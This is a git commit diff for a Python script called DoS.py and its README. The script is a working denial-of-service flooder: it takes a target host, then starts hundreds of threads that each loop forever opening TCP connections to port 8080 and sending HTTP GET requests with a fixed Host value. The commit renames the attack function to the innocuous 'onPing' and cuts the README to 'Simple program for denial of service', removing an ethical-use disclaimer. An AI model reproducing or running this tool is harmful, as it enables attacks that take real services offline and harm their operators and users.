db91eaf4367adbc83e7895a9b9e3658b4dd0521b
Shame <07licenciaparamatar@gmail.com>
2021-01-17 15:38:38 +0100

    Mejora de rendimiento

--- DoS.py
+++ DoS.py
@@ -1,26 +1,28 @@
 import threading
 import socket
+import os
+import time
 
-objetivo  = input('Objetivo: ')
-puerto    = 8080
-mascara   = '182.21.20.32'
+obj  = input('Objetivo: ')
+p    = 8080
+mac   = '182.21.20.32'
 
-conexion = 0
+cnex = 0
 
-def ataque():
+def onPing():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((objetivo, puerto))
-        s.sendto(("GET /" + objetivo + "HTTP/1.1\r\n").encode('ascii'), (objetivo, puerto))
-        s.sendto(("Host: " + mascara + "\r\n\r\n").encode('ascii'), (objetivo, puerto))
+        s.connect((obj, p))
+        s.sendto(("GET /" + obj + "HTTP/1.1\r\n").encode('ascii'), (obj, p))
+        s.sendto(("Host: " + mac + "\r\n\r\n").encode('ascii'), (obj, p))
         s.close()
         
-        global conexion
-        conexion += 1
-        if conexion % 5000 == 0:
-            print(conexion)
+        global cnex
+        cnex += 1
+        if cnex % 500 == 0:
+            print(cnex, end="\r")
 
-for i in range(10000):
-    thread = threading.Thread(target = ataque)
+
+for i in range(500):
+    thread = threading.Thread(target = onPing)
     thread.start()
-    
--- README.md
+++ README.md
@@ -1,11 +1,3 @@
 # DoS.py
 
-First of all this is for ethical using, the bad behaviour or bad using of this file is everyone's responsibility I do not take charge of the use given to this file.
-
-Simple to use, first of all you must to have download Python Interpreter. After you have downloaded this file, just double-click on it and run the program.
-
-On the objective you can use an avaiable IP or just a Domain, sometimes you will need to change the port.
-
-That's all :)
-
-Do not redistribute pls <3
+Simple program for denial of service 
